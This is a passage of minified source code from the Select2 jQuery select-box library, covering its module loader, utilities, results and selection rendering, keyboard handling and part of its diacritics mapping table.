                        if ((v = t).deps && h(v.deps, v.callback), !i) return;
                        i.splice ? (t = i, i = n, n = null) : t = e
                    }
                    return i = i || function () {
                    }, "function" == typeof n && (n = o, o = s), o ? u(e, t, i, n) : setTimeout((function () {
                        u(e, t, i, n)
                    }), 4), h
                }, h.config = function (t) {
                    return h(t)
                }, t._defined = g, (n = function (t, e, i) {
                    if ("string" != typeof t) throw new Error("See almond README: incorrect module build, no module name");
                    e.splice || (i = e, e = []), o(g, t) || o(m, t) || (m[t] = [t, e, i])
                }).amd = {jQuery: !0}
            }(), e.requirejs = t, e.require = i, e.define = n)
        }(), e.define("almond", (function () {
        })), e.define("jquery", [], (function () {
            var e = t || $;
            return null == e && console && console.error && console.error("Select2: An instance of jQuery or a jQuery-compatible library was not found. Make sure that you are including jQuery before Select2 on your web page."), e
        })), e.define("select2/utils", ["jquery"], (function (t) {
            function e(t) {
                var e = t.prototype, i = [];
                for (var n in e) {
                    "function" == typeof e[n] && "constructor" !== n && i.push(n)
                }
                return i
            }

            var i = {
                Extend: function (t, e) {
                    function i() {
                        this.constructor = t
                    }

                    var n = {}.hasOwnProperty;
                    for (var o in e) n.call(e, o) && (t[o] = e[o]);
                    return i.prototype = e.prototype, t.prototype = new i, t.__super__ = e.prototype, t
                }, Decorate: function (t, i) {
                    function n() {
                        var e = Array.prototype.unshift, n = i.prototype.constructor.length,
                            o = t.prototype.constructor;
                        n > 0 && (e.call(arguments, t.prototype.constructor), o = i.prototype.constructor), o.apply(this, arguments)
                    }

                    var o = e(i), s = e(t);
                    i.displayName = t.displayName, n.prototype = new function () {
                        this.constructor = n
                    };
                    for (var r = 0; r < s.length; r++) {
                        var a = s[r];
                        n.prototype[a] = t.prototype[a]
                    }
                    for (var l = function (t) {
                        var e = function () {
                        };
                        t in n.prototype && (e = n.prototype[t]);
                        var o = i.prototype[t];
                        return function () {
                            var t = Array.prototype.unshift;
                            return t.call(arguments, e), o.apply(this, arguments)
                        }
                    }, c = 0; c < o.length; c++) {
                        var d = o[c];
                        n.prototype[d] = l(d)
                    }
                    return n
                }
            }, n = function () {
                this.listeners = {}
            };
            return n.prototype.on = function (t, e) {
                this.listeners = this.listeners || {}, t in this.listeners ? this.listeners[t].push(e) : this.listeners[t] = [e]
            }, n.prototype.trigger = function (t) {
                var e = Array.prototype.slice;
                this.listeners = this.listeners || {}, t in this.listeners && this.invoke(this.listeners[t], e.call(arguments, 1)), "*" in this.listeners && this.invoke(this.listeners["*"], arguments)
            }, n.prototype.invoke = function (t, e) {
                for (var i = 0, n = t.length; n > i; i++) t[i].apply(this, e)
            }, i.Observable = n, i.generateChars = function (t) {
                for (var e = "", i = 0; t > i; i++) {
                    e += Math.floor(36 * Math.random()).toString(36)
                }
                return e
            }, i.bind = function (t, e) {
                return function () {
                    t.apply(e, arguments)
                }
            }, i._convertData = function (t) {
                for (var e in t) {
                    var i = e.split("-"), n = t;
                    if (1 !== i.length) {
                        for (var o = 0; o < i.length; o++) {
                            var s = i[o];
                            (s = s.substring(0, 1).toLowerCase() + s.substring(1)) in n || (n[s] = {}), o == i.length - 1 && (n[s] = t[e]), n = n[s]
                        }
                        delete t[e]
                    }
                }
                return t
            }, i.hasScroll = function (e, i) {
                var n = t(i), o = i.style.overflowX, s = i.style.overflowY;
                return (o !== s || "hidden" !== s && "visible" !== s) && ("scroll" === o || "scroll" === s || (n.innerHeight() < i.scrollHeight || n.innerWidth() < i.scrollWidth))
            }, i.escapeMarkup = function (t) {
                var e = {
                    "\\": "&#92;",
                    "&": "&amp;",
                    "<": "&lt;",
                    ">": "&gt;",
                    '"': "&quot;",
                    "'": "&#39;",
                    "/": "&#47;"
                };
                return "string" != typeof t ? t : String(t).replace(/[&<>"'\/\\]/g, (function (t) {
                    return e[t]
                }))
            }, i.appendMany = function (e, i) {
                if ("1.7" === t.fn.jquery.substr(0, 3)) {
                    var n = t();
                    t.map(i, (function (t) {
                        n = n.add(t)
                    })), i = n
                }
                e.append(i)
            }, i
        })), e.define("select2/results", ["jquery", "./utils"], (function (t, e) {
            function i(t, e, n) {
                this.$element = t, this.data = n, this.options = e, i.__super__.constructor.call(this)
            }

            return e.Extend(i, e.Observable), i.prototype.render = function () {
                var e = t('<ul class="select2-results__options" role="tree"></ul>');
                return this.options.get("multiple") && e.attr("aria-multiselectable", "true"), this.$results = e, e
            }, i.prototype.clear = function () {
                this.$results.empty()
            }, i.prototype.displayMessage = function (e) {
                var i = this.options.get("escapeMarkup");
                this.clear(), this.hideLoading();
                var n = t('<li role="treeitem" aria-live="assertive" class="select2-results__option"></li>'),
                    o = this.options.get("translations").get(e.message);
                n.append(i(o(e.args))), n[0].className += " select2-results__message", this.$results.append(n)
            }, i.prototype.hideMessages = function () {
                this.$results.find(".select2-results__message").remove()
            }, i.prototype.append = function (t) {
                this.hideLoading();
                var e = [];
                if (null != t.results && 0 !== t.results.length) {
                    t.results = this.sort(t.results);
                    for (var i = 0; i < t.results.length; i++) {
                        var n = t.results[i], o = this.option(n);
                        e.push(o)
                    }
                    this.$results.append(e)
                } else 0 === this.$results.children().length && this.trigger("results:message", {message: "noResults"})
            }, i.prototype.position = function (t, e) {
                e.find(".select2-results").append(t)
            }, i.prototype.sort = function (t) {
                return this.options.get("sorter")(t)
            }, i.prototype.setClasses = function () {
                var e = this;
                this.data.current((function (i) {
                    var n = t.map(i, (function (t) {
                        return t.id.toString()
                    })), o = e.$results.find(".select2-results__option[aria-selected]");
                    o.each((function () {
                        var e = t(this), i = t.data(this, "data"), o = "" + i.id;
                        null != i.element && i.element.selected || null == i.element && t.inArray(o, n) > -1 ? e.attr("aria-selected", "true") : e.attr("aria-selected", "false")
                    }));
                    var s = o.filter("[aria-selected=true]");
                    s.length > 0 ? s.first().trigger("mouseenter") : o.first().trigger("mouseenter")
                }))
            }, i.prototype.showLoading = function (t) {
                this.hideLoading();
                var e = {disabled: !0, loading: !0, text: this.options.get("translations").get("searching")(t)},
                    i = this.option(e);
                i.className += " loading-results", this.$results.prepend(i)
            }, i.prototype.hideLoading = function () {
                this.$results.find(".loading-results").remove()
            }, i.prototype.option = function (e) {
                var i = document.createElement("li");
                i.className = "select2-results__option";
                var n = {role: "treeitem", "aria-selected": "false"};
                for (var o in e.disabled && (delete n["aria-selected"], n["aria-disabled"] = "true"), null == e.id && delete n["aria-selected"], null != e._resultId && (i.id = e._resultId), e.title && (i.title = e.title), e.children && (n.role = "group", n["aria-label"] = e.text, delete n["aria-selected"]), n) {
                    var s = n[o];
                    i.setAttribute(o, s)
                }
                if (e.children) {
                    var r = t(i), a = document.createElement("strong");
                    a.className = "select2-results__group", t(a), this.template(e, a);
                    for (var l = [], c = 0; c < e.children.length; c++) {
                        var d = e.children[c], u = this.option(d);
                        l.push(u)
                    }
                    var h = t("<ul></ul>", {class: "select2-results__options select2-results__options--nested"});
                    h.append(l), r.append(a), r.append(h)
                } else this.template(e, i);
                return t.data(i, "data", e), i
            }, i.prototype.bind = function (e, i) {
                var n = this, o = e.id + "-results";
                this.$results.attr("id", o), e.on("results:all", (function (t) {
                    n.clear(), n.append(t.data), e.isOpen() && n.setClasses()
                })), e.on("results:append", (function (t) {
                    n.append(t.data), e.isOpen() && n.setClasses()
                })), e.on("query", (function (t) {
                    n.hideMessages(), n.showLoading(t)
                })), e.on("select", (function () {
                    e.isOpen() && n.setClasses()
                })), e.on("unselect", (function () {
                    e.isOpen() && n.setClasses()
                })), e.on("open", (function () {
                    n.$results.attr("aria-expanded", "true"), n.$results.attr("aria-hidden", "false"), n.setClasses(), n.ensureHighlightVisible()
                })), e.on("close", (function () {
                    n.$results.attr("aria-expanded", "false"), n.$results.attr("aria-hidden", "true"), n.$results.removeAttr("aria-activedescendant")
                })), e.on("results:toggle", (function () {
                    var t = n.getHighlightedResults();
                    0 !== t.length && t.trigger("mouseup")
                })), e.on("results:select", (function () {
                    var t = n.getHighlightedResults();
                    if (0 !== t.length) {
                        var e = t.data("data");
                        "true" == t.attr("aria-selected") ? n.trigger("close", {}) : n.trigger("select", {data: e})
                    }
                })), e.on("results:previous", (function () {
                    var t = n.getHighlightedResults(), e = n.$results.find("[aria-selected]"), i = e.index(t);
                    if (0 !== i) {
                        var o = i - 1;
                        0 === t.length && (o = 0);
                        var s = e.eq(o);
                        s.trigger("mouseenter");
                        var r = n.$results.offset().top, a = s.offset().top, l = n.$results.scrollTop() + (a - r);
                        0 === o ? n.$results.scrollTop(0) : 0 > a - r && n.$results.scrollTop(l)
                    }
                })), e.on("results:next", (function () {
                    var t = n.getHighlightedResults(), e = n.$results.find("[aria-selected]"), i = e.index(t) + 1;
                    if (!(i >= e.length)) {
                        var o = e.eq(i);
                        o.trigger("mouseenter");
                        var s = n.$results.offset().top + n.$results.outerHeight(!1),
                            r = o.offset().top + o.outerHeight(!1), a = n.$results.scrollTop() + r - s;
                        0 === i ? n.$results.scrollTop(0) : r > s && n.$results.scrollTop(a)
                    }
                })), e.on("results:focus", (function (t) {
                    t.element.addClass("select2-results__option--highlighted")
                })), e.on("results:message", (function (t) {
                    n.displayMessage(t)
                })), t.fn.mousewheel && this.$results.on("mousewheel", (function (t) {
                    var e = n.$results.scrollTop(), i = n.$results.get(0).scrollHeight - e + t.deltaY,
                        o = t.deltaY > 0 && e - t.deltaY <= 0, s = t.deltaY < 0 && i <= n.$results.height();
                    o ? (n.$results.scrollTop(0), t.preventDefault(), t.stopPropagation()) : s && (n.$results.scrollTop(n.$results.get(0).scrollHeight - n.$results.height()), t.preventDefault(), t.stopPropagation())
                })), this.$results.on("mouseup", ".select2-results__option[aria-selected]", (function (e) {
                    var i = t(this), o = i.data("data");
                    return "true" === i.attr("aria-selected") ? void (n.options.get("multiple") ? n.trigger("unselect", {
                        originalEvent: e,
                        data: o
                    }) : n.trigger("close", {})) : void n.trigger("select", {originalEvent: e, data: o})
                })), this.$results.on("mouseenter", ".select2-results__option[aria-selected]", (function (e) {
                    var i = t(this).data("data");
                    n.getHighlightedResults().removeClass("select2-results__option--highlighted"), n.trigger("results:focus", {
                        data: i,
                        element: t(this)
                    })
                }))
            }, i.prototype.getHighlightedResults = function () {
                return this.$results.find(".select2-results__option--highlighted")
            }, i.prototype.destroy = function () {
                this.$results.remove()
            }, i.prototype.ensureHighlightVisible = function () {
                var t = this.getHighlightedResults();
                if (0 !== t.length) {
                    var e = this.$results.find("[aria-selected]").index(t), i = this.$results.offset().top,
                        n = t.offset().top, o = this.$results.scrollTop() + (n - i), s = n - i;
                    o -= 2 * t.outerHeight(!1), 2 >= e ? this.$results.scrollTop(0) : (s > this.$results.outerHeight() || 0 > s) && this.$results.scrollTop(o)
                }
            }, i.prototype.template = function (e, i) {
                var n = this.options.get("templateResult"), o = this.options.get("escapeMarkup"), s = n(e, i);
                null == s ? i.style.display = "none" : "string" == typeof s ? i.innerHTML = o(s) : t(i).append(s)
            }, i
        })), e.define("select2/keys", [], (function () {
            return {
                BACKSPACE: 8,
                TAB: 9,
                ENTER: 13,
                SHIFT: 16,
                CTRL: 17,
                ALT: 18,
                ESC: 27,
                SPACE: 32,
                PAGE_UP: 33,
                PAGE_DOWN: 34,
                END: 35,
                HOME: 36,
                LEFT: 37,
                UP: 38,
                RIGHT: 39,
                DOWN: 40,
                DELETE: 46
            }
        })), e.define("select2/selection/base", ["jquery", "../utils", "../keys"], (function (t, e, i) {
            function n(t, e) {
                this.$element = t, this.options = e, n.__super__.constructor.call(this)
            }

            return e.Extend(n, e.Observable), n.prototype.render = function () {
                var e = t('<span class="select2-selection" role="combobox"  aria-haspopup="true" aria-expanded="false"></span>');
                return this._tabindex = 0, null != this.$element.data("old-tabindex") ? this._tabindex = this.$element.data("old-tabindex") : null != this.$element.attr("tabindex") && (this._tabindex = this.$element.attr("tabindex")), e.attr("title", this.$element.attr("title")), e.attr("tabindex", this._tabindex), this.$selection = e, e
            }, n.prototype.bind = function (t, e) {
                var n = this, o = (t.id, t.id + "-results");
                this.container = t, this.$selection.on("focus", (function (t) {
                    n.trigger("focus", t)
                })), this.$selection.on("blur", (function (t) {
                    n._handleBlur(t)
                })), this.$selection.on("keydown", (function (t) {
                    n.trigger("keypress", t), t.which === i.SPACE && t.preventDefault()
                })), t.on("results:focus", (function (t) {
                    n.$selection.attr("aria-activedescendant", t.data._resultId)
                })), t.on("selection:update", (function (t) {
                    n.update(t.data)
                })), t.on("open", (function () {
                    n.$selection.attr("aria-expanded", "true"), n.$selection.attr("aria-owns", o), n._attachCloseHandler(t)
                })), t.on("close", (function () {
                    n.$selection.attr("aria-expanded", "false"), n.$selection.removeAttr("aria-activedescendant"), n.$selection.removeAttr("aria-owns"), n.$selection.focus(), n._detachCloseHandler(t)
                })), t.on("enable", (function () {
                    n.$selection.attr("tabindex", n._tabindex)
                })), t.on("disable", (function () {
                    n.$selection.attr("tabindex", "-1")
                }))
            }, n.prototype._handleBlur = function (e) {
                var i = this;
                window.setTimeout((function () {
                    document.activeElement == i.$selection[0] || t.contains(i.$selection[0], document.activeElement) || i.trigger("blur", e)
                }), 1)
            }, n.prototype._attachCloseHandler = function (e) {
                t(document.body).on("mousedown.select2." + e.id, (function (e) {
                    var i = t(e.target).closest(".select2");
                    t(".select2.select2-container--open").each((function () {
                        var e = t(this);
                        this != i[0] && e.data("element").select2("close")
                    }))
                }))
            }, n.prototype._detachCloseHandler = function (e) {
                t(document.body).off("mousedown.select2." + e.id)
            }, n.prototype.position = function (t, e) {
                e.find(".selection").append(t)
            }, n.prototype.destroy = function () {
                this._detachCloseHandler(this.container)
            }, n.prototype.update = function (t) {
                throw new Error("The `update` method must be defined in child classes.")
            }, n
        })), e.define("select2/selection/single", ["jquery", "./base", "../utils", "../keys"], (function (t, e, i, n) {
            function o() {
                o.__super__.constructor.apply(this, arguments)
            }

            return i.Extend(o, e), o.prototype.render = function () {
                var t = o.__super__.render.call(this);
                return t.addClass("select2-selection--single"), t.html('<span class="select2-selection__rendered"></span><span class="select2-selection__arrow" role="presentation"><b role="presentation"></b></span>'), t
            }, o.prototype.bind = function (t, e) {
                var i = this;
                o.__super__.bind.apply(this, arguments);
                var n = t.id + "-container";
                this.$selection.find(".select2-selection__rendered").attr("id", n), this.$selection.attr("aria-labelledby", n), this.$selection.on("mousedown", (function (t) {
                    1 === t.which && i.trigger("toggle", {originalEvent: t})
                })), this.$selection.on("focus", (function (t) {
                })), this.$selection.on("blur", (function (t) {
                })), t.on("selection:update", (function (t) {
                    i.update(t.data)
                }))
            }, o.prototype.clear = function () {
                this.$selection.find(".select2-selection__rendered").empty()
            }, o.prototype.display = function (t, e) {
                var i = this.options.get("templateSelection");
                return this.options.get("escapeMarkup")(i(t, e))
            }, o.prototype.selectionContainer = function () {
                return t("<span></span>")
            }, o.prototype.update = function (t) {
                if (0 !== t.length) {
                    var e = t[0], i = this.$selection.find(".select2-selection__rendered"), n = this.display(e, i);
                    i.empty().append(n), i.prop("title", e.title || e.text)
                } else this.clear()
            }, o
        })), e.define("select2/selection/multiple", ["jquery", "./base", "../utils"], (function (t, e, i) {
            function n(t, e) {
                n.__super__.constructor.apply(this, arguments)
            }

            return i.Extend(n, e), n.prototype.render = function () {
                var t = n.__super__.render.call(this);
                return t.addClass("select2-selection--multiple"), t.html('<ul class="select2-selection__rendered"></ul>'), t
            }, n.prototype.bind = function (e, i) {
                var o = this;
                n.__super__.bind.apply(this, arguments), this.$selection.on("click", (function (t) {
                    o.trigger("toggle", {originalEvent: t})
                })), this.$selection.on("click", ".select2-selection__choice__remove", (function (e) {
                    if (!o.options.get("disabled")) {
                        var i = t(this).parent().data("data");
                        o.trigger("unselect", {originalEvent: e, data: i})
                    }
                }))
            }, n.prototype.clear = function () {
                this.$selection.find(".select2-selection__rendered").empty()
            }, n.prototype.display = function (t, e) {
                var i = this.options.get("templateSelection");
                return this.options.get("escapeMarkup")(i(t, e))
            }, n.prototype.selectionContainer = function () {
                return t('<li class="select2-selection__choice"><span class="select2-selection__choice__remove" role="presentation">&times;</span></li>')
            }, n.prototype.update = function (t) {
                if (this.clear(), 0 !== t.length) {
                    for (var e = [], n = 0; n < t.length; n++) {
                        var o = t[n], s = this.selectionContainer(), r = this.display(o, s);
                        s.append(r), s.prop("title", o.title || o.text), s.data("data", o), e.push(s)
                    }
                    var a = this.$selection.find(".select2-selection__rendered");
                    i.appendMany(a, e)
                }
            }, n
        })), e.define("select2/selection/placeholder", ["../utils"], (function (t) {
            function e(t, e, i) {
                this.placeholder = this.normalizePlaceholder(i.get("placeholder")), t.call(this, e, i)
            }

            return e.prototype.normalizePlaceholder = function (t, e) {
                return "string" == typeof e && (e = {id: "", text: e}), e
            }, e.prototype.createPlaceholder = function (t, e) {
                var i = this.selectionContainer();
                return i.html(this.display(e)), i.addClass("select2-selection__placeholder").removeClass("select2-selection__choice"), i
            }, e.prototype.update = function (t, e) {
                var i = 1 == e.length && e[0].id != this.placeholder.id;
                if (e.length > 1 || i) return t.call(this, e);
                this.clear();
                var n = this.createPlaceholder(this.placeholder);
                this.$selection.find(".select2-selection__rendered").append(n)
            }, e
        })), e.define("select2/selection/allowClear", ["jquery", "../keys"], (function (t, e) {
            function i() {
            }

            return i.prototype.bind = function (t, e, i) {
                var n = this;
                t.call(this, e, i), null == this.placeholder && this.options.get("debug") && window.console && console.error && console.error("Select2: The `allowClear` option should be used in combination with the `placeholder` option."), this.$selection.on("mousedown", ".select2-selection__clear", (function (t) {
                    n._handleClear(t)
                })), e.on("keypress", (function (t) {
                    n._handleKeyboardClear(t, e)
                }))
            }, i.prototype._handleClear = function (t, e) {
                if (!this.options.get("disabled")) {
                    var i = this.$selection.find(".select2-selection__clear");
                    if (0 !== i.length) {
                        e.stopPropagation();
                        for (var n = i.data("data"), o = 0; o < n.length; o++) {
                            var s = {data: n[o]};
                            if (this.trigger("unselect", s), s.prevented) return
                        }
                        this.$element.val(this.placeholder.id).trigger("change"), this.trigger("toggle", {})
                    }
                }
            }, i.prototype._handleKeyboardClear = function (t, i, n) {
                n.isOpen() || (i.which == e.DELETE || i.which == e.BACKSPACE) && this._handleClear(i)
            }, i.prototype.update = function (e, i) {
                if (e.call(this, i), !(this.$selection.find(".select2-selection__placeholder").length > 0 || 0 === i.length)) {
                    var n = t('<span class="select2-selection__clear">&times;</span>');
                    n.data("data", i), this.$selection.find(".select2-selection__rendered").prepend(n)
                }
            }, i
        })), e.define("select2/selection/search", ["jquery", "../utils", "../keys"], (function (t, e, i) {
            function n(t, e, i) {
                t.call(this, e, i)
            }

            return n.prototype.render = function (e) {
                var i = t('<li class="select2-search select2-search--inline"><input class="select2-search__field" type="search" tabindex="-1" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" role="textbox" aria-autocomplete="list" /></li>');
                this.$searchContainer = i, this.$search = i.find("input");
                var n = e.call(this);
                return this._transferTabIndex(), n
            }, n.prototype.bind = function (t, e, n) {
                var o = this;
                t.call(this, e, n), e.on("open", (function () {
                    o.$search.trigger("focus")
                })), e.on("close", (function () {
                    o.$search.val(""), o.$search.removeAttr("aria-activedescendant"), o.$search.trigger("focus")
                })), e.on("enable", (function () {
                    o.$search.prop("disabled", !1), o._transferTabIndex()
                })), e.on("disable", (function () {
                    o.$search.prop("disabled", !0)
                })), e.on("focus", (function (t) {
                    o.$search.trigger("focus")
                })), e.on("results:focus", (function (t) {
                    o.$search.attr("aria-activedescendant", t.id)
                })), this.$selection.on("focusin", ".select2-search--inline", (function (t) {
                    o.trigger("focus", t)
                })), this.$selection.on("focusout", ".select2-search--inline", (function (t) {
                    o._handleBlur(t)
                })), this.$selection.on("keydown", ".select2-search--inline", (function (t) {
                    if (t.stopPropagation(), o.trigger("keypress", t), o._keyUpPrevented = t.isDefaultPrevented(), t.which === i.BACKSPACE && "" === o.$search.val()) {
                        var e = o.$searchContainer.prev(".select2-selection__choice");
                        if (e.length > 0) {
                            var n = e.data("data");
                            o.searchRemoveChoice(n), t.preventDefault()
                        }
                    }
                }));
                var s = document.documentMode, r = s && 11 >= s;
                this.$selection.on("input.searchcheck", ".select2-search--inline", (function (t) {
                    return r ? void o.$selection.off("input.search input.searchcheck") : void o.$selection.off("keyup.search")
                })), this.$selection.on("keyup.search input.search", ".select2-search--inline", (function (t) {
                    if (r && "input" === t.type) o.$selection.off("input.search input.searchcheck"); else {
                        var e = t.which;
                        e != i.SHIFT && e != i.CTRL && e != i.ALT && e != i.TAB && o.handleSearch(t)
                    }
                }))
            }, n.prototype._transferTabIndex = function (t) {
                this.$search.attr("tabindex", this.$selection.attr("tabindex")), this.$selection.attr("tabindex", "-1")
            }, n.prototype.createPlaceholder = function (t, e) {
                this.$search.attr("placeholder", e.text)
            }, n.prototype.update = function (t, e) {
                var i = this.$search[0] == document.activeElement;
                this.$search.attr("placeholder", ""), t.call(this, e), this.$selection.find(".select2-selection__rendered").append(this.$searchContainer), this.resizeSearch(), i && this.$search.focus()
            }, n.prototype.handleSearch = function () {
                if (this.resizeSearch(), !this._keyUpPrevented) {
                    var t = this.$search.val();
                    this.trigger("query", {term: t})
                }
                this._keyUpPrevented = !1
            }, n.prototype.searchRemoveChoice = function (t, e) {
                this.trigger("unselect", {data: e}), this.$search.val(e.text), this.handleSearch()
            }, n.prototype.resizeSearch = function () {
                this.$search.css("width", "25px");
                var t = "";
                "" !== this.$search.attr("placeholder") ? t = this.$selection.find(".select2-selection__rendered").innerWidth() : t = .75 * (this.$search.val().length + 1) + "em";
                this.$search.css("width", t)
            }, n
        })), e.define("select2/selection/eventRelay", ["jquery"], (function (t) {
            function e() {
            }

            return e.prototype.bind = function (e, i, n) {
                var o = this,
                    s = ["open", "opening", "close", "closing", "select", "selecting", "unselect", "unselecting"],
                    r = ["opening", "closing", "selecting", "unselecting"];
                e.call(this, i, n), i.on("*", (function (e, i) {
                    if (-1 !== t.inArray(e, s)) {
                        i = i || {};
                        var n = t.Event("select2:" + e, {params: i});
                        o.$element.trigger(n), -1 !== t.inArray(e, r) && (i.prevented = n.isDefaultPrevented())
                    }
                }))
            }, e
        })), e.define("select2/translation", ["jquery", "require"], (function (t, e) {
            function i(t) {
                this.dict = t || {}
            }

            return i.prototype.all = function () {
                return this.dict
            }, i.prototype.get = function (t) {
                return this.dict[t]
            }, i.prototype.extend = function (e) {
                this.dict = t.extend({}, e.all(), this.dict)
            }, i._cache = {}, i.loadPath = function (t) {
                if (!(t in i._cache)) {
                    var n = e(t);
                    i._cache[t] = n
                }
                return new i(i._cache[t])
            }, i
        })), e.define("select2/diacritics", [], (function () {
            return {
                "Ⓐ": "A",
                "Ａ": "A",
                "À": "A",
                "Á": "A",
                "Â": "A",
                "Ầ": "A",
                "Ấ": "A",
                "Ẫ": "A",
                "Ẩ": "A",
                "Ã": "A",
                "Ā": "A",
                "Ă": "A",
                "Ằ": "A",
                "Ắ": "A",
                "Ẵ": "A",
                "Ẳ": "A",
                "Ȧ": "A",
                "Ǡ": "A",
                "Ä": "A",
                "Ǟ": "A",
                "Ả": "A",
                "Å": "A",
                "Ǻ": "A",
                "Ǎ": "A",
                "Ȁ": "A",
                "Ȃ": "A",
                "Ạ": "A",
                "Ậ": "A",
                "Ặ": "A",
                "Ḁ": "A",
                "Ą": "A",
                "Ⱥ": "A",
                "Ɐ": "A",
                "Ꜳ": "AA",
                "Æ": "AE",
                "Ǽ": "AE",
                "Ǣ": "AE",
                "Ꜵ": "AO",
                "Ꜷ": "AU",
                "Ꜹ": "AV",
                "Ꜻ": "AV",
                "Ꜽ": "AY",
                "Ⓑ": "B",
                "Ｂ": "B",
                "Ḃ": "B",
                "Ḅ": "B",
                "Ḇ": "B",
                "Ƀ": "B",
                "Ƃ": "B",
                "Ɓ": "B",
                "Ⓒ": "C",
                "Ｃ": "C",
                "Ć": "C",
                "Ĉ": "C",
                "Ċ": "C",
                "Č": "C",
                "Ç": "C",
                "Ḉ": "C",
                "Ƈ": "C",
                "Ȼ": "C",
                "Ꜿ": "C",
                "Ⓓ": "D",
                "Ｄ": "D",
                "Ḋ": "D",
                "Ď": "D",
                "Ḍ": "D",
                "Ḑ": "D",
                "Ḓ": "D",
                "Ḏ": "D",
                "Đ": "D",
                "Ƌ": "D",
                "Ɗ": "D",
                "Ɖ": "D",
                "Ꝺ": "D",
                "Ǳ": "DZ",
                "Ǆ": "DZ",
                "ǲ": "Dz",
                "ǅ": "Dz",
                "Ⓔ": "E",
                "Ｅ": "E",
                "È": "E",
                "É": "E",
                "Ê": "E",
                "Ề": "E",
                "Ế": "E",
                "Ễ": "E",
                "Ể": "E",
                "Ẽ": "E",
                "Ē": "E",
                "Ḕ": "E",
                "Ḗ": "E",
                "Ĕ": "E",
                "Ė": "E",
                "Ë": "E",
                "Ẻ": "E",
                "Ě": "E",
                "Ȅ": "E",
                "Ȇ": "E",
                "Ẹ": "E",
                "Ệ": "E",
                "Ȩ": "E",
                "Ḝ": "E",
                "Ę": "E",
                "Ḙ": "E",
                "Ḛ": "E",
                "Ɛ": "E",
                "Ǝ": "E",
                "Ⓕ": "F",
                "Ｆ": "F",
                "Ḟ": "F",
                "Ƒ": "F",
                "Ꝼ": "F",
                "Ⓖ": "G",
                "Ｇ": "G",
                "Ǵ": "G",
                "Ĝ": "G",
                "Ḡ": "G",
                "Ğ": "G",
                "Ġ": "G",
                "Ǧ": "G",
                "Ģ": "G",
                "Ǥ": "G",
                "Ɠ": "G",
                "Ꞡ": "G",
                "Ᵹ": "G",
                "Ꝿ": "G",
                "Ⓗ": "H",
                "Ｈ": "H",
                "Ĥ": "H",
                "Ḣ": "H",
                "Ḧ": "H",
                "Ȟ": "H",
                "Ḥ": "H",
                "Ḩ": "H",
                "Ḫ": "H",
                "Ħ": "H",
                "Ⱨ": "H",
                "Ⱶ": "H",
                "Ɥ": "H",
                "Ⓘ": "I",
                "Ｉ": "I",
                "Ì": "I",
                "Í": "I",
                "Î": "I",
                "Ĩ": "I",
                "Ī": "I",
                "Ĭ": "I",
                "İ": "I",
                "Ï": "I",
                "Ḯ": "I",
                "Ỉ": "I",
                "Ǐ": "I",
                "Ȉ": "I",
                "Ȋ": "I",
                "Ị": "I",
                "Į": "I",
                "Ḭ": "I",
                "Ɨ": "I",
                "Ⓙ": "J",
                "Ｊ": "J",
                "Ĵ": "J",
                "Ɉ": "J",
                "Ⓚ": "K",
                "Ｋ": "K",
                "Ḱ": "K",
                "Ǩ": "K",
                "Ḳ": "K",
                "Ķ": "K",
                "Ḵ": "K",
                "Ƙ": "K",
                "Ⱪ": "K",
                "Ꝁ": "K",
                "Ꝃ": "K",
                "Ꝅ": "K",
                "Ꞣ": "K",
                "Ⓛ": "L",
                "Ｌ": "L",
                "Ŀ": "L",
                "Ĺ": "L",
                "Ľ": "L",
                "Ḷ": "L",
                "Ḹ": "L",
                "Ļ": "L",
                "Ḽ": "L",
                "Ḻ": "L",
                "Ł": "L",
                "Ƚ": "L",
                "Ɫ": "L",
                "Ⱡ": "L",
                "Ꝉ": "L",
                "Ꝇ": "L",
                "Ꞁ": "L",
                "Ǉ": "LJ",
                "ǈ": "Lj",
                "Ⓜ": "M",
                "Ｍ": "M",
                "Ḿ": "M",
                "Ṁ": "M",
                "Ṃ": "M",
                "Ɱ": "M",
                "Ɯ": "M",
                "Ⓝ": "N",
                "Ｎ": "N",
                "Ǹ": "N",
                "Ń": "N",
                "Ñ": "N",
                "Ṅ": "N",
                "Ň": "N",
                "Ṇ": "N",
                "Ņ": "N",
                "Ṋ": "N",
                "Ṉ": "N",
                "Ƞ": "N",
                "Ɲ": "N",
                "Ꞑ": "N",
                "Ꞥ": "N",
                "Ǌ": "NJ",
                "ǋ": "Nj",
                "Ⓞ": "O",
                "Ｏ": "O",
                "Ò": "O",
                "Ó": "O",
                "Ô": "O",
                "Ồ": "O",
                "Ố": "O",
                "Ỗ": "O",
                "Ổ": "O",
                "Õ": "O",
                "Ṍ": "O",
                "Ȭ": "O",
                "Ṏ": "O",
                "Ō": "O",
                "Ṑ": "O",
                "Ṓ": "O",
                "Ŏ": "O",
                "Ȯ": "O",
                "Ȱ": "O",
                "Ö": "O",
                "Ȫ": "O",
                "Ỏ": "O",
                "Ő": "O",
                "Ǒ": "O",
                "Ȍ": "O",
                "Ȏ": "O",
                "Ơ": "O",
                "Ờ": "O",
                "Ớ": "O",
                "Ỡ": "O",
                "Ở": "O",
                "Ợ": "O",
                "Ọ": "O",
                "Ộ": "O",
                "Ǫ": "O",
                "Ǭ": "O",
                "Ø": "O",
                "Ǿ": "O",
                "Ɔ": "O",
                "Ɵ": "O",
                "Ꝋ": "O",
                "Ꝍ": "O",
                "Ƣ": "OI",
                "Ꝏ": "OO",
                "Ȣ": "OU",
                "Ⓟ": "P",
                "Ｐ": "P",
                "Ṕ": "P",
                "Ṗ": "P",
                "Ƥ": "P",
                "Ᵽ": "P",
                "Ꝑ": "P",
                "Ꝓ": "P",
                "Ꝕ": "P",
                "Ⓠ": "Q",
                "Ｑ": "Q",
                "Ꝗ": "Q",
                "Ꝙ": "Q",
                "Ɋ": "Q",
                "Ⓡ": "R",
                "Ｒ": "R",
                "Ŕ": "R",
                "Ṙ": "R",
                "Ř": "R",
                "Ȑ": "R",
                "Ȓ": "R",
                "Ṛ": "R",
                "Ṝ": "R",
                "Ŗ": "R",
                "Ṟ": "R",
                "Ɍ": "R",
                "Ɽ": "R",
                "Ꝛ": "R",
                "Ꞧ": "R",
                "Ꞃ": "R",
                "Ⓢ": "S",
                "Ｓ": "S",
                "ẞ": "S",
                "Ś": "S",
                "Ṥ": "S",
                "Ŝ": "S",
                "Ṡ": "S",
                "Š": "S",
                "Ṧ": "S",
                "Ṣ": "S",
                "Ṩ": "S",
                "Ș": "S",
                "Ş": "S",
                "Ȿ": "S",
                "Ꞩ": "S",
                "Ꞅ": "S",
                "Ⓣ": "T",
